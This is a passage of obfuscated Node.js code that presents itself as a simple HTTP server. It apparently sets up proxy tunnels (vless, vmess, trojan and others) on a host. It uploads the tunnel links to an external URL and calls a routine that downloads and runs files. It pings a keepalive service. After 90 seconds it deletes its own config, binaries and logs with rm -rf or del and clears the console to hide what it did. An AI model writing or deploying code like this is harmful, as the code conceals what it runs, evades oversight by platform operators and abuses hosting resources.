_0x374058=fs[_0x402cc9(0x193)](listPath,_0x402cc9(0x14b)),_0xc2aa56=_0x374058['split']('\x0a')[_0x402cc9(0x138)](_0x6defdc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x402cc9(0x15a)](_0x6defdc));if(_0xc2aa56['length']===0x0)return;const _0x35d7cb=JSON[_0x402cc9(0x141)]({'nodes':_0xc2aa56});try{const _0x38e283=await axios['post'](UPLOAD_URL+_0x402cc9(0x1ca),_0x35d7cb,{'headers':{'Content-Type':'application/json'}});return _0x38e283&&_0x38e283[_0x402cc9(0x1a2)]===0xc8?(console[_0x402cc9(0x1af)](_0x402cc9(0x1d2)),_0x38e283):null;}catch(_0x3846a8){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x888979=_0x2651,_0x2ecb25=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2ecb25[_0x888979(0x157)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2ecb25[_0x888979(0x157)](phpPath);process['platform']===_0x888979(0x103)?exec('del\x20/f\x20/q\x20'+_0x2ecb25['join']('\x20')+_0x888979(0x17b),_0x2cf421=>{const _0x11fff=_0x888979;console[_0x11fff(0x1c2)](),console[_0x11fff(0x1af)]('App\x20is\x20running'),console[_0x11fff(0x1af)](_0x11fff(0x110));}):exec('rm\x20-rf\x20'+_0x2ecb25[_0x888979(0x165)]('\x20')+_0x888979(0x1d6),_0x453869=>{const _0x51af60=_0x888979;console['clear'](),console['log'](_0x51af60(0x11a)),console[_0x51af60(0x1af)](_0x51af60(0x110));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2f272d=_0x9baf07;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2f272d(0x1af)](_0x2f272d(0xfe));return;}try{const _0x175066=await axios['post'](_0x2f272d(0x1b8),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2f272d(0x187)}});return console['log'](_0x2f272d(0x180)),_0x175066;}catch(_0x5c5bd2){return console[_0x2f272d(0x108)](_0x2f272d(0x15d)+_0x5c5bd2['message']),null;}}async function startserver(){const _0x2fa8c4=_0x9baf07;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x13e656){console['error'](_0x2fa8c4(0x121),_0x13e656);}}startserver()[_0x9baf07(0x148)](_0x1c7967=>{const _0x1c6067=_0x9baf07;console[_0x1c6067(0x108)](_0x1c6067(0x152),_0x1c7967);}),app[_0x9baf07(0x106)]('/',async function(_0x491d9f,_0x4e93af){const _0xdf2daa=_0x9baf07;try{const _0x2ece7a=path[_0xdf2daa(0x165)](__dirname,_0xdf2daa(0x1ac)),_0x4b8913=await fs[_0xdf2daa(0x1a5)]['readFile'](_0x2ece7a,'utf8');_0x4e93af[_0xdf2daa(0x1ad)](_0x4b8913);}catch(_0x4a6c2c){_0x4e93af[_0xdf2daa(0x1ad)](_0xdf2daa(0xff));}}),app[_0x9baf07(0x1aa)](PORT,()=>console[_0x9baf07(0x1af)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
